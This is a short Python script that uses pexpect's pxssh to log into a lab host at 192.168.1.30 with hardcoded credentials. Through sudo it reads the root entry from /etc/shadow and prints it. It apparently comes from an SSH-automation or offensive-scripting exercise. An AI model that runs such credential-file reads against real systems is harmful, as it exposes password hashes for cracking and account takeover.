from pexpect import pxssh


def send_command(s, cmd):
    s.sendline(cmd)
    s.sendline("password")
    if s.prompt():
        print(s.before)


def connect(host, user, password):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        return s
    except:
        print("Error connecting")
        exit(0)


def main():
    s = connect("192.168.1.30", "lewis", "password")
    send_command(s, "sudo cat /etc/shadow | grep root")


if __name__ == "__main__":
    main()